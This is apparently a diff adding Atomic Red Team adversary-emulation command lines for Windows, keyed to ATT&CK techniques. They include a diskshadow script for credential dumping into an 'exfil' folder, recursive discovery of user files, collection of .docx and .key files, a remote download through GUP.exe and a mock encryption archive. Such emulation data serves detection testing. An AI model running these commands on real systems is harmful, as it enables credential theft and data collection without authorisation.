@@ -1,0 +1,11 @@
+"cmd.exe" /c mkdir c:\exfil & diskshadow.exe /s C:\AtomicRedTeam\atomics\T1003.003\src\diskshadow.txt
+"cmd.exe" /c rmdir /s /q %%temp%%\deleteme_T1551.004
+"cmd.exe" /c dir /s c:\ >> %%temp%%\T1083Test1.txt & dir /s "c:\Documents and Settings" >> %%temp%%\T1083Test1.txt & dir /s "c:\Program Files\" >> %%temp%%\T1083Test1.txt & dir "%%systemdrive%%\Users\*.*" >> %%temp%%\T1083Test1.txt & dir "%%userprofile%%\AppData\Roaming\Microsoft\Windows\Recent\*.*" >> %%temp%%\T1083Test1.txt & dir "%%userprofile%%\Desktop\*.*" >> %%temp%%\T1083Test1.txt & tree /F >> %%temp%%\T1083Test1.txt
+"cmd.exe" /c mkdir "c:\Temp" & cd C:\AtomicRedTeam\atomics\T1105\bin\ & GUP.exe -unzipTo "" "C:\Temp" "Sample https://getsamplefiles.com/download/zip/sample-2.zip CAC4D26F32CA629DFB10FE614ED00EB1066A0C0011386290D3426C3DE2E53AC6"
+"cmd.exe" /c mkdir %%temp%%\T1119_command_prompt_collection >nul 2>&1 & dir c: /b /s .docx | findstr /e .docx & for /R c:\ %%f in (*.docx) do copy /Y %%f %%temp%%\T1119_command_prompt_collection
+C:\WINDOWS\system32\cmd.exe  /S /D /c" dir c: /b /s .docx "
+"cmd.exe" /c mkdir "%%TEMP%%\art-expand-out" >nul 2>&1 & echo hello from atomic red team > "C:\AtomicRedTeam\atomics\T1140\src\art-expand-source.txt" & makecab "C:\AtomicRedTeam\atomics\T1140\src\art-expand-source.txt" "%%TEMP%%\art-expand-test.cab" & pushd "%%TEMP%%\art-expand-out" & expand "%%TEMP%%\art-expand-test.cab" -F:* . & popd
+"cmd.exe" /c dir /s /b %%USERPROFILE%%\Favorites
+"cmd.exe" /c dir c:\ /b /s .key | findstr /e .key
+C:\WINDOWS\system32\cmd.exe  /S /D /c" dir c:\ /b /s .key "
+"cmd.exe" /c path=%%path%%;"C:\Program Files (x86)\winzip" & mkdir .\tmp\victim-files & cd .\tmp\victim-files & echo "This file will be encrypted" > .\encrypted_file.txt & "%%ProgramFiles%%\WinZip\winzip64.exe" -min -a -s"hello" archive.zip * & dir
